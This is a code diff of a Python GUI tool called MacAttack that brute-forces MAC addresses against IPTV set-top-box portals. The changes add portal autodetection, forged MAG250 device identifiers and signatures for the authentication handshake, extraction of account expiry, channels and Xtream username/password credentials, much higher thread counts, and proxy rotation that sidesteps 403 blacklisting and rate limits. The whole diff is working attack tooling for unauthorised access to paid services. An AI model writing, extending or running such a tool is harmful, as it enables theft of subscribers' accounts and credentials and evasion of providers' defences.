-        if not hostname_input or not mac_address:
+        if not hostname_input or not mac:
             QMessageBox.warning(
                 self,
                 "Warning",
@@ -1242,11 +1302,11 @@ class MacAttack(QMainWindow):
         self.base_url = urlunparse(
             (parsed_url.scheme, parsed_url.netloc, "", "", "", "")
         )
-        self.mac_address = mac_address
+        self.mac = mac
 
         # Initialize session and get token
         self.session = requests.Session()
-        self.token = get_token(self.session, self.base_url, self.mac_address)
+        self.token, self.token_random = get_token(self.session, self.base_url, self.mac)
         self.token_timestamp = time.time()
 
         if not self.token:
@@ -1272,9 +1332,10 @@ class MacAttack(QMainWindow):
 
         self.request_thread = RequestThread(
             self.base_url,
-            mac_address,
+            mac,
             self.session,
             self.token,
+            self.token_random,
             num_threads=num_threads,
         )
         self.request_thread.request_complete.connect(self.on_initial_playlist_received)
@@ -1283,93 +1344,9 @@ class MacAttack(QMainWindow):
         self.current_request_thread = self.request_thread
         logging.debug("Started RequestThread for playlist.")
 
-    """this needs to be reworked
-    def filter_playlist(self):
-        search_term = self.search_input.text().lower()
-        for tab_name, self.tab_info in self.tab_data.items():
-            # Retrieve the playlist model and current view data
-            playlist_model = self.tab_info.get("self.playlist_model")
-            if not playlist_model:
-                logging.debug(
-                    f"Warning: No 'playlist_model' found for tab '{tab_name}'. Skipping."
-                )
-                continue
-            current_view = self.tab_info.get("current_view")
-            self.visible_data = self.tab_info.get("playlist_data", [])
-            # Filter the visible data
-            filtered_data = self._filter_items(self.visible_data, search_term)
-            # Filter other related data (channels, series) if necessary
-            filtered_channels = self._filter_items(
-                self.tab_info.get("current_channels", []), search_term
-            )
-            filtered_series = self._filter_items(
-                self.tab_info.get("current_series_info", []), search_term
-            )
-            # Update the playlist model with the filtered data
-            self._populate_playlist_model(
-                playlist_model, filtered_channels, filtered_data, filtered_series
-            )
-            # Log what was filtered
-            logging.debug(
-                f"Filtered {len(filtered_data)} items for tab '{tab_name}' in view '{current_view}'."
-            )
-
-    def _populate_playlist_model(self, playlist_model, channels, playlists, series):
-        # Helper function to clear and populate the playlist model.
-        playlist_model.clear()
-        # the "Go Back" item if we are not in a filtered state
-        if (
-            not self.search_input.text() and playlists
-        ):  # Only Go Back if not filtering
-            playlist_model.appendRow(QStandardItem("Go Back"))
-        # filtered channels
-        for item in channels:
-            list_item = self._create_list_item(item, item["name"], item["item_type"])
-            playlist_model.appendRow(list_item)
-        # filtered playlists
-        for item in playlists:
-            name = item.get("name", "Unnamed") if isinstance(item, dict) else str(item)
-            item_type = (
-                item.get("type", "category") if isinstance(item, dict) else str(item)
-            )
-            playlist_item = self._create_list_item(item, name, item_type)
-            playlist_model.appendRow(playlist_item)
-        # filtered series (seasons/episodes)
-        for item in series:
-            item_type = item.get("item_type")
-            if item_type == "season":
-                name = f"Season {item['season_number']}"
-            elif item_type == "episode":
-                name = f"Episode {item['episode_number']}"
-            else:
-                name = item.get("name") or item.get("title")
-            list_item = QStandardItem(name)
-            list_item.setData(item, Qt.UserRole)
-            list_item.setData(item_type, Qt.UserRole + 1)
-            playlist_model.appendRow(list_item)
-
-    def _filter_items(self, items, search_term):
-        # Helper function to filter items based on the search term.
-        return [
-            item
-            for item in items
-            if search_term
-            in str(
-                item
-            ).lower()  # Make sure it checks the correct property for filtering
-        ]
-
-    def _create_list_item(self, data, name, item_type):
-        # Helper function to list item with attached data.
-        list_item = QStandardItem(name)
-        list_item.setData(data, Qt.UserRole)
-        list_item.setData(item_type, Qt.UserRole + 1)
-        return list_item
-    """
-
     def update_proxy(self):
-        proxy_address = self.proxy_input.text()
         # Set or remove the environment variables for the proxy
+        proxy_address = self.proxy_input.text()
         if proxy_address:
             os.environ["http_proxy"] = proxy_address
             os.environ["https_proxy"] = proxy_address
@@ -1380,7 +1357,9 @@ class MacAttack(QMainWindow):
                 del os.environ["https_proxy"]
 
     def restart_vlc_instance(self):
-        referer_url = self.hostname_input.text()  # Get the referer URL from QLineEdit
+        referer_url = (
+            self.hostname_input.text()
+        )  # Get the referer URL from the hostname
         base_path = (
             sys._MEIPASS if getattr(sys, "frozen", False) else os.path.abspath(".")
         )
@@ -1447,30 +1426,25 @@ class MacAttack(QMainWindow):
 
     def build_Proxy_gui(self, parent):
         proxy_layout = QVBoxLayout(parent)
-        # Horizontal layout for checkbox and other input
         proxy_checkbox_layout = QHBoxLayout()
-        # a 15px space on the left side
         proxy_checkbox_layout.addSpacing(15)
-        # Checkbox for enabling proxy fetching
+        # Checkbox for enabling proxies
         self.proxy_enabled_checkbox = QCheckBox("Enable Proxies")
-        self.proxy_enabled_checkbox.setFixedWidth(
-            120
-        )  # Set the checkbox width to 120px
+        self.proxy_enabled_checkbox.setFixedWidth(120)
         proxy_checkbox_layout.addWidget(self.proxy_enabled_checkbox)
-        # a stretch to push elements to the right
         proxy_checkbox_layout.addStretch(1)
-        # Label for "Remove proxies from list after"
+        # Remove proxy after
         self.proxy_label = QLabel("Remove proxies after")
         self.proxy_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
         proxy_checkbox_layout.addWidget(self.proxy_label)
-        # SpinBox for error count
+        # Error count spinbox
         self.proxy_remove_errorcount = QSpinBox()
         self.proxy_remove_errorcount.setRange(0, 9)  # Restrict to 2-digit range
         self.proxy_remove_errorcount.setFixedWidth(30)  # Set width for 2 digits
         self.proxy_remove_errorcount.setValue(5)  # Default value
         self.proxy_remove_errorcount.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
         proxy_checkbox_layout.addWidget(self.proxy_remove_errorcount)
-        # Label for "connection errors"
+        # Consecutive errors
         self.connection_errors_label = QLabel("consecutive errors. (0 to disable)")
         self.connection_errors_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
         proxy_checkbox_layout.addWidget(self.connection_errors_label)
@@ -1542,7 +1516,9 @@ class MacAttack(QMainWindow):
         self.update_hourly_checkbox.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)
         self.update_hourly_checkbox.stateChanged.connect(self.proxy_auto_updater)
         # Remove top and bottom spacing and padding using a stylesheet
-        self.update_hourly_checkbox.setStyleSheet("QCheckBox { margin: 0px; padding: 3px; }")
+        self.update_hourly_checkbox.setStyleSheet(
+            "QCheckBox { margin: 0px; padding: 3px; }"
+        )
         # Add the checkbox to the layout
         generate_proxy_layout.addWidget(self.update_hourly_checkbox)
 
@@ -1625,8 +1601,10 @@ class MacAttack(QMainWindow):
             self.remaining_time -= 1
             minutes = self.remaining_time // 60
             seconds = self.remaining_time % 60
-            #self.update_timer_label.setText(f"{minutes:02}:{seconds:02}")
-            self.update_hourly_checkbox.setText(f"Get Proxies Hourly {minutes:02}:{seconds:02}")
+            # self.update_timer_label.setText(f"{minutes:02}:{seconds:02}")
+            self.update_hourly_checkbox.setText(
+                f"Get Proxies Hourly {minutes:02}:{seconds:02}"
+            )
         else:
             self.hourly_timer.stop()  # Stop the timer
             self.hourly_timer = None  # Clear the timer reference
@@ -1679,17 +1657,6 @@ class MacAttack(QMainWindow):
         proxy_count = len(proxy_lines)
         # Update the label with the current number of proxies
         self.proxy_count_label.setText(f"Proxies: {proxy_count}")
-
-    def update_proxy_fetching_speed(self, value):
-        # Log the value to confirm it's being passed correctly
-        logging.info(f"Setting proxy fetching speed to: {value}")
-        # Update the speed for fetching and testing proxies
-        self.proxy_fetcher.proxy_fetching_speed = value
-        self.proxy_fetcher.proxy_testing_speed = (
-            value * 3
-        )  # Increase testing speed proportionally
-        self.proxy_output.append(f"Proxy fetching speed set at: {value}")
-        #self.proxy_speed_value_label.setText(str(self.proxy_concurrent_tests.value()))
 
     def get_proxies(self):
         self.proxy_fetcher.start()  # Start the background thread
@@ -2198,23 +2165,23 @@ class MacAttack(QMainWindow):
                 contains_mac_addr_phrase = any("MAC Addr: " in line for line in lines)
 
                 for line in lines:
-                    mac_address = line.strip()
+                    mac = line.strip()
 
-                    if mac_address:  # Ignore empty lines
+                    if mac:  # Ignore empty lines
                         if contains_mac_addr_phrase:
                             # Only consider lines containing "MAC Addr: "
-                            if "MAC Addr: " in mac_address:
-                                mac_address = mac_address.replace(
+                            if "MAC Addr: " in mac:
+                                mac = mac.replace(
                                     "MAC Addr: ", ""
                                 ).strip()  # Remove the prefix
-                                if mac_address:  # Ensure it's not empty after stripping
+                                if mac:  # Ensure it's not empty after stripping
                                     unique_macs.add(
-                                        mac_address
+                                        mac
                                     )  # Add to set (automatically handles duplicates)
                         else:
                             # If the phrase "MAC Addr: " is not present in any line, consider the line as a MAC address
                             unique_macs.add(
-                                mac_address
+                                mac
                             )  # Add to set (automatically handles duplicates)
 
             # Now update mac_dict with unique MAC addresses
@@ -2252,7 +2219,7 @@ class MacAttack(QMainWindow):
                 "QCheckBox { background-color: black; color: red; }"
             )
             self.concurrent_tests.setRange(1, 1000)
-            #self.proxy_concurrent_tests.setRange(1, 1000)
+            # self.proxy_concurrent_tests.setRange(1, 1000)
         else:
             # Reset text and styling for unchecked state
             self.ludicrous_speed_checkbox.setText("Enable Ludicrous Speed!")
@@ -2260,7 +2227,7 @@ class MacAttack(QMainWindow):
                 "QCheckBox { background-color: #666666; color: white; }"
             )
             self.concurrent_tests.setRange(1, 100)  # Default range
-            #self.proxy_concurrent_tests.setRange(1, 100)
+            # self.proxy_concurrent_tests.setRange(1, 100)
 
     def update_mac_label(self, text):
         """Update the MAC address label in the main thread."""
@@ -2360,7 +2327,7 @@ class MacAttack(QMainWindow):
         dropdown_label_layout.setSpacing(10)
 
         # Spacer to the left of IPTV type label
-        #left_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
+        # left_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
         dropdown_label_layout.addItem(left_spacer)
         dropdown_label_layout.addSpacing(20)  # Adds space
 
@@ -2368,11 +2335,12 @@ class MacAttack(QMainWindow):
         self.iptv_type_label = QLabel("Type:")
         dropdown_label_layout.addWidget(self.iptv_type_label)
 
-
         # Dropdown box
         self.dropdown_box = QComboBox()
-        self.dropdown_box.addItems(["Portal", "Stalker_Portal", "Portalstb"])
-        self.dropdown_box.currentIndexChanged.connect(self.set_portal_type)  # Connect signal to function
+        self.dropdown_box.addItems(["Autodetect", "Portal", "Stalker_Portal"])
+        self.dropdown_box.currentIndexChanged.connect(
+            self.set_portal_type_detected
+        )  # Connect signal to function
         dropdown_label_layout.addWidget(self.dropdown_box, alignment=Qt.AlignLeft)
 
         # Center spacer for label alignment
@@ -2385,6 +2353,7 @@ class MacAttack(QMainWindow):
 
         # Right spacer to balance the layout
         right_spacer = QSpacerItem(20, 0, QSizePolicy.Expanding, QSizePolicy.Minimum)
+        dropdown_label_layout.addItem(right_spacer)
         dropdown_label_layout.addItem(right_spacer)
 
         layout.addLayout(dropdown_label_layout)
@@ -2447,13 +2416,17 @@ class MacAttack(QMainWindow):
         layout.addWidget(self.error_text)
         layout.addSpacing(15)  # Adds space
 
-    def set_portal_type(self, index):
+    def set_portal_type_detected(self, index):
         global portaltype
         # Get the text of the selected item
         selected_item = self.dropdown_box.currentText()
 
         # Log or process the selected portal type
-        if selected_item == "Portal":
+        if selected_item == "Autodetect":
+            logging.info("Portal type selected: AUTODETECT")
+            portaltype = None
+            # Add any logic specific to Portal here
+        elif selected_item == "Portal":
             logging.info("Portal type selected: Portal")
             portaltype = "portal.php"
             # Add any logic specific to Portal here
@@ -2461,10 +2434,6 @@ class MacAttack(QMainWindow):
             logging.info("Portal type selected: Stalker Portal")
             portaltype = "stalker_portal/server/load.php"
             # Add any logic specific to Stalker Portal here
-        elif selected_item == "Portalstb":
-            logging.info("Portal type selected: Portalstb")
-            portaltype = "portalstb/portal.php"
-            # Add any logic specific to Custom here
         else:
             logging.info(f"Unknown portal type selected: {selected_item}")
 
@@ -2564,7 +2533,7 @@ class MacAttack(QMainWindow):
             self.proxy_location_output_checkbox.setChecked(False)
             self.singleoutputfile_checkbox.setChecked(True)
             self.proxy_location_output_checkbox.setChecked(False)
-            #self.proxy_concurrent_tests.setValue(100)
+            # self.proxy_concurrent_tests.setValue(100)
             self.proxy_remove_errorcount.setValue(5)
             self.proxy_input.setText("")
             self.output_buffer_spinbox.setValue(2500)
@@ -2609,7 +2578,7 @@ class MacAttack(QMainWindow):
             "active_tab": str(self.tabs.currentIndex()),
             "proxy_enabled": str(self.proxy_enabled_checkbox.isChecked()),
             "proxy_list": self.proxy_textbox.toPlainText(),
-            #"proxy_concurrent_tests": str(self.proxy_concurrent_tests.value()),
+            # "proxy_concurrent_tests": str(self.proxy_concurrent_tests.value()),
             "proxy_remove_errorcount": str(self.proxy_remove_errorcount.value()),
             "ludicrous_speed": str(self.ludicrous_speed_checkbox.isChecked()),
             "deviceid_output": str(self.deviceid_output_checkbox.isChecked()),
@@ -2738,9 +2707,9 @@ class MacAttack(QMainWindow):
             self.proxy_textbox.setPlainText(
                 config.get("Settings", "proxy_list", fallback="")
             )
-            #self.proxy_concurrent_tests.setValue(
+            # self.proxy_concurrent_tests.setValue(
             #    config.getint("Settings", "proxy_concurrent_tests", fallback=100)
-            #)
+            # )
             self.proxy_remove_errorcount.setValue(
                 config.getint("Settings", "proxy_remove_errorcount", fallback=5)
             )
@@ -2811,9 +2780,7 @@ class MacAttack(QMainWindow):
         self.start_button.setDisabled(True)
         self.stop_button.setDisabled(False)
         if self.proxy_enabled_checkbox.isChecked():
-            self.brute_mac_label.setText(
-                "Please Wait...\nLoading the worker proxies into the background and assigning tasks."
-            )
+            self.brute_mac_label.setText("Please Wait...\nLoading.")
         else:
             self.brute_mac_label.setText("Please Wait...")
         # Pause for 1 second before starting threads
@@ -2827,40 +2794,106 @@ class MacAttack(QMainWindow):
 
     def _create_threads(self):
         global portaltype
+        portal_type_detected = False
+        if portaltype is not None:
+            portal_type_detected = True  # Skip autodetect if user set
+            logging.debug("Skipping Autodetect")
+        else:
+            logging.debug("NEEDS AUTODETECT")
+
         # Get and parse the IPTV link
         self.iptv_link = self.iptv_link_entry.text()
         self.parsed_url = urlparse(self.iptv_link)
-        print("1")
+        logging.debug("1")
         self.parsed_path = self.parsed_url.path
-        print (self.parsed_path)
-        #remove the c/ from the path
-        print("2")
+        logging.debug(self.parsed_path)
+        # remove the c/ from the path
+        logging.debug("2")
         if self.parsed_path.endswith("c"):
             self.parsed_path = self.parsed_path[:-1]
         if self.parsed_path.endswith("c/"):
             self.parsed_path = self.parsed_path[:-2]
-        print("3")
-        print (self.parsed_path)
+        logging.debug("3")
+        logging.debug(self.parsed_path)
         self.host = self.parsed_url.hostname
         self.port = self.parsed_url.port or 80
+        self.base_url = f"http://{self.host}:{self.port}"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+            "Accept-Encoding": "identity",
+            "Accept": "*/*",
+            "Connection": "keep-alive",
+        }
+
+        if not portal_type_detected:  # Check for type portal
+            version_url = f"{self.base_url}/c/version.js"
+            try:
+                response = requests.get(
+                    version_url, headers=headers
+                )  # Add headers here
+                response.raise_for_status()  # Raise an exception for HTTP errors
+
+                # Extract the version using a regex
+                match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
+                if match:
+                    self.portal_version = match.group(1)  # Extracted version string
+                    logging.debug(version_url)
+                    logging.info(
+                        f"\n\n\nPortal type: PORTAL version: {self.portal_version}\n\n\n"
+                    )
+                    portal_type_detected = "portal"
+                    logging.info("Portal type selected: Portal")
+                    portaltype = "portal.php"
+                else:
+                    logging.debug("Version declaration not found in the file.")
+            except requests.RequestException as e:
+                logging.debug(f"Not type PORTAL: {e}")
+
+        if not portal_type_detected:  # check for type stalker_portal
+            version_url = f"{self.base_url}/stalker_portal/c/version.js"
+            try:
+                response = requests.get(
+                    version_url, headers=headers
+                )  # Add headers here
+                response.raise_for_status()  # Raise an exception for HTTP errors
+
+                # Extract the version using a regex
+                match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
+                if match:
+                    self.portal_version = match.group(1)  # Extracted version string
+                    logging.debug(version_url)
+                    logging.info(
+                        f"\n\n\nPortal type: STALKER_PORTAL version: {self.portal_version}\n\n\n"
+                    )
+                    portal_type_detected = "stalker_portal"
+                    portaltype = "stalker_portal/server/load.php"
+                else:
+                    logging.debug("Version declaration not found in the file.")
+            except requests.RequestException as e:
+                logging.debug(f"Not type STALKER_PORTAL: {e}")
+
+        if not portal_type_detected:  # Others failed, default to "portal"
+            portaltype = "portal.php"
+            self.portal_version = "5.3.1"
+
         self.base_url = f"http://{self.host}:{self.port}{self.parsed_path}"
+
         # if both url and method contain "stalker_portal/" then remove it from the url
         if "stalker_portal/" in self.base_url and "stalker_portal/" in portaltype:
             self.base_url = self.base_url.replace("stalker_portal/", "")
-        print(self.base_url)
-        print(portaltype)
-
+        logging.debug(self.base_url)
+        logging.info(f"Portal Type: {portaltype}")
 
         # Calculate the number of threads to start
         num_tests = self.concurrent_tests.value()
         if self.proxy_enabled_checkbox.isChecked() and num_tests > 1:
-            max_value = 400
+            max_value = 500
             if max_value < 15:
                 max_value = 15
             num_tests = 1 + (num_tests - 1) * (max_value - 1) / (100 - 1)
             num_tests = int(num_tests)
             if self.ludicrous_speed_checkbox.isChecked() and num_tests > 1:
-                max_value = 4000
+                max_value = 5000
                 if max_value < 15:
                     max_value = 15
                 num_tests = 1 + (num_tests - 1) * (max_value - 1) / (1800 - 1)
@@ -2931,8 +2964,11 @@ class MacAttack(QMainWindow):
         password = None
         middleware_city = None
         middleware_ip_address = None
+        backend_host = None
+        backend_ip_address = None
         self.recentlyfound = []  # Erase recently found list
         self.nomacs = 1
+
         while self.running:  # Loop will continue as long as self.running is True
 
             # Checkbox states
@@ -2989,11 +3025,11 @@ class MacAttack(QMainWindow):
             serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
             sn = serialnumber[0:13]
             device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
-            device_id = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
             device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
             hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
-            signature_string = f'{sn}{mac}'
-            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+            snmac = f"{sn}{mac}"
+            sig = hashlib.sha256(snmac.encode()).hexdigest().upper()
+
             if not proxies:
                 self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
             if proxies:
@@ -3001,8 +3037,10 @@ class MacAttack(QMainWindow):
                     f"Testing MAC: {mac:<19} Using PROXY: {selected_proxy:<23}"
                 )
             try:
+
                 with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                     macattacksess = requests.Session()  # session
+
                     # Disable the use of environment proxy settings
                     macattacksess.proxies.clear()  # Clears any environment proxies
                     macattacksess.cookies.update(
@@ -3021,22 +3059,22 @@ class MacAttack(QMainWindow):
                     macattacksess.headers.update(
                         {
                             "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                            "Accept-Encoding": "gzip, deflate, zstd",
+                            "Accept-Encoding": "identity",
                             "Accept": "*/*",
-                            "Cache-Control": "no-cache",
+                            "Connection": "keep-alive",
                         }
                     )
 
-                    url = f"{self.base_url}/{portaltype}?action=handshake&type=stb&JsHttpRequest=1-xml"
+                    url = f"{self.base_url}{portaltype}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
 
-                    
-                    logging.info(f"{url}")
-                    
+                    logging.debug(f"Getting URL {url}")
+
                     # If proxy is enabled, the proxy to the session
                     if proxies:
                         macattacksess.proxies.update(proxies)
 
-                    res = macattacksess.get(url, timeout=timeout, allow_redirects=False)
+                    res = macattacksess.get(url, timeout=timeout)
+
                     logging.debug(f"Status Code: {res.status_code}")
                     if custommacs:
                         if (
@@ -3057,71 +3095,97 @@ class MacAttack(QMainWindow):
                                 # Handle the case when the deque is empty
                                 logging.info("Pool is empty, cannot pop anything.")
 
-                    logging.info(
-                        f"Response Text: {res.text}"
-                    )
+                    logging.info(f"Response Text: {res.text}")
                     logging.debug(f"Response Headers: {res.headers}")
+                    token = None
                     if res.text:
                         data = json.loads(res.text)
                         token = data.get("js", {}).get("token")
-                        token_random = data.get("js", {}).get("random")  # Extract 'random' if present
+                        token_random = data.get("js", {}).get(
+                            "random"
+                        )  # Extract 'random' if present
 
-                        # Log details
-                        logging.info(
-                            f"TOKEN: {token} "
-                            f"RANDOM: {token_random if token_random else 'N/A'} "
-                            f"MAC: {mac} "
-                            f"BASEURL: {self.base_url}"
-                        )
-                        
+                    if token:
+                        token_random = None
+                        token_random = (
+                            res.json().get("js", {}).get("random")
+                        )  # Extract 'random' if present
+                        logging.info(f"Token retrieved: {token}")
+
                         if token_random:
-                            print("RANDOM FOUND")
-
-                            # Get profile first to activate portals that use a "random"
-                            metrics = {'mac': mac, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': token_random} 
-
-                            macattacksess.headers.update(
-                                {
-                                    'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
-                                    'Accept-Encoding': 'gzip, deflate, zstd',
-                                    'Accept': '*/*',
-                                    'Connection': 'close',
-                                    'Cache-Control': 'no-cache',
-                                    'Authorization': f'Bearer {token}',  # token to headers
-                                    'X-Random': '{token_random}',
-                                    'Content-Type': 'application/x-www-form-urlencoded',
-                                }
+                            logging.info(f"RANDOM: {token_random}")
+                            sig = (
+                                hashlib.sha256(token_random.encode())
+                                .hexdigest()
+                                .upper()
                             )
 
-                            macattacksess.cookies.update(
-                                {
-                                    'adid': hw_version_2,
-                                    'debug': '1',
-                                    'device_id2': device_id2,
-                                    'device_id': device_id,
-                                    'hw_version': '1.7-BD-00',
-                                    'mac': mac,
-                                    'sn': sn,
-                                    'stb_lang': 'en',
-                                    'timezone': 'America/Los_Angeles',
-                                }
-                            )
-                            
-                            
-                            url1_a = f"{self.base_url}/{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.6.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&signature={signature}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp=1735503369&api_signature=262&prehash=0"
-                            # Activate the portal by getting the profile with the correct headers cookies and id's
-                            res1_a = macattacksess.get(url1_a)
-     
-                        
+                            metrics = {
+                                "mac": mac,
+                                "sn": sn,
+                                "type": "STB",
+                                "model": "MAG250",
+                                "uid": device_id,
+                                "random": token_random,
+                            }
+                            json_string = json.dumps(metrics)
+                            encoded_string = urllib.parse.quote(json_string)
+                        else:
+
+                            token_random = 0
+                            sig = hashlib.sha256(snmac.encode()).hexdigest().upper()
+
+                            metrics = {
+                                "mac": mac,
+                                "sn": sn,
+                                "type": "STB",
+                                "model": "MAG250",
+                                "uid": device_id,
+                                "random": token_random,
+                            }
+                            json_string = json.dumps(metrics)
+                            encoded_string = urllib.parse.quote(json_string)
+
+                        logging.debug(encoded_string)
+                        macattacksess.headers.update(
+                            {
+                                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+                                "Accept-Encoding": "identity",
+                                "Accept": "*/*",
+                                "Connection": "keep-alive",
+                                "Authorization": f"Bearer {token}",  # token to headers
+                                "X-Random": f"{token_random}",
+                            }
+                        )
+
+                        macattacksess.cookies.update(
+                            {
+                                "adid": hw_version_2,
+                                "debug": "1",
+                                "device_id2": device_id2,
+                                "device_id": device_id,
+                                "hw_version": "1.7-BD-00",
+                                "mac": mac,
+                                "sn": sn,
+                                "stb_lang": "en",
+                                "timezone": "America/Los_Angeles",
+                            }
+                        )
+
+                        url1_a = f"{self.base_url}/{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: {self.portal_version}; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
+                        # Activate the portal by getting the profile with the correct headers cookies and id's
+                        res1_a = macattacksess.get(url1_a)
+                        logging.debug(res1_a.text)
+
                         url2 = f"{self.base_url}/{portaltype}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
 
                         res2 = macattacksess.get(
                             url2, timeout=timeout, allow_redirects=False
                         )
 
-                        #logging.info(f"2Status Code: {res2.status_code}")
-                        print(f"2Response Text: {res2.text}")
-                        #logging.info(f"2Response Headers: {res2.headers}")
+                        logging.info(f"2Status Code: {res2.status_code}")
+                        logging.debug(f"2Response Text: {res2.text}")
+                        logging.info(f"2Response Headers: {res2.headers}")
 
                         if res2.text:
                             data = json.loads(res2.text)
@@ -3132,17 +3196,21 @@ class MacAttack(QMainWindow):
                             ):
                                 mac = data["js"]["mac"]
                                 expiry = data["js"]["phone"]
-                                
+                                if expiry == "":
+                                    expiry = "Unknown"
+
                                 try:
                                     # Try to convert the string to an integer (it could be a Unix timestamp)
                                     timestamp = int(expiry)
-                                    expiry = datetime.utcfromtimestamp(timestamp).strftime('%B %d, %Y, %I:%M %p')
+                                    expiry = datetime.utcfromtimestamp(
+                                        timestamp
+                                    ).strftime("%B %d, %Y, %I:%M %p")
                                 except ValueError:
                                     # If it fails, it likely is already in a human-readable format
                                     pass
 
-                                print(expiry)  # This will print the human-readable date                                
-                                
+                                logging.debug(expiry)
+
                                 url3 = f"{self.base_url}/{portaltype}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                                 res3 = macattacksess.get(
                                     url3,
@@ -3216,11 +3284,6 @@ class MacAttack(QMainWindow):
 
                                     except json.JSONDecodeError as e:
                                         logging.debug(f"Failed to parse JSON: {e}")
-                                        userfound = 0
-                                    except Exception as e:
-                                        logging.debug(
-                                            f"An unexpected error occurred: {e}"
-                                        )
                                         userfound = 0
                                     if userfound == 1:
                                         xtream_url = f"{self.base_url}/player_api.php?username={username}&password={password}"
@@ -3414,7 +3477,7 @@ class MacAttack(QMainWindow):
 
                                     backend_ip_address = None
 
-                                    if include_ip_addresses:
+                                    if include_ip_addresses and backend_host:
                                         try:
                                             backend_ip_address = resolve_ip_address(
                                                 backend_host, "0.0.0.0"
@@ -3455,7 +3518,7 @@ class MacAttack(QMainWindow):
                                         )
 
                                     result_message = (
-                                        f"{'~Portal~:':<10} {self.iptv_link}\n"
+                                        f"{'Portal  :':<10} {self.iptv_link}\n"
                                     )
                                     result_message += f"{'MAC Addr:':<10} {mac}\n"
 
@@ -3468,6 +3531,8 @@ class MacAttack(QMainWindow):
                                         include_location_and_timezone
                                         and include_ip_addresses
                                         and middleware_city
+                                        and middleware_city != "Unknown"
+                                        and middleware_timezone != "Unknown"
                                     ):
                                         result_message += (
                                             f" ({middleware_city}, {middleware_country})\n"
@@ -3514,6 +3579,7 @@ class MacAttack(QMainWindow):
                                         include_proxy_location
                                         and selected_proxy != "Your Connection"
                                         and include_proxy_used
+                                        and proxy_city != "Unknown"
                                     ):
                                         result_message += (
                                             f" ({proxy_city}, {proxy_country})\n"
@@ -3577,13 +3643,16 @@ class MacAttack(QMainWindow):
                             else:
                                 # self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
                                 logging.info(f"No JSON response for MAC {mac}")
+                                self.proxy_error_counts[selected_proxy] = 0
             # Try failed because data was non json
             except (
                 json.decoder.JSONDecodeError,
                 requests.exceptions.RequestException,
                 TypeError,
             ) as e:
-                logging.debug(f"~Non JSON {str(e)}")
+
+                logging.info(f"~No JSON {str(e)}")
+                # logging.info(f"Response {res.text}")
                 if "Expecting value" in str(e):
                     # logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                     if (
@@ -3631,6 +3700,7 @@ class MacAttack(QMainWindow):
                         or "logoSophosFooter" in res.text
                         or "connection_error" in res.text
                         or "ERR_CONNECT_FAIL" in res.text
+                        or "An error occurred." in res.text
                         or "The server is not responding" in res.text
                     ):
                         # Track error count for the proxy
@@ -3772,7 +3842,11 @@ class MacAttack(QMainWindow):
                         self.remove_proxy(
                             selected_proxy, self.proxy_error_counts
                         )  # remove the proxy if it exceeds the
-                    elif "DNS resolution error" in res.text:
+                    elif (
+                        "DNS resolution error" in res.text
+                        or "DNS lookup failed" in res.text
+                        or "ERR_DNS_FAIL" in res.text
+                    ):
                         # Track error count for the proxy
                         if selected_proxy not in self.proxy_error_counts:
                             self.proxy_error_counts[selected_proxy] = 1
@@ -3957,8 +4031,11 @@ class MacAttack(QMainWindow):
                             f"Error for Proxy: {selected_proxy} : <b>Portal not found</b> couldnt find the portal."
                             # Not removing this to prevent proxy removal in case of a connection error.
                         )
-                    elif "403 Forbidden" in res.text:  # i dont think this is an error
-                        self.proxy_error_counts[selected_proxy] = 0
+                    elif "403 Forbidden" in res.text or "403: Forbidden" in res.text:
+                        self.update_error_text_signal.emit(
+                            f"Error for Portal: <b>403 Forbidden</b> {selected_proxy} <b>Blacklisted</b> or <b>ratelimited</b>"
+                        )
+                        self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
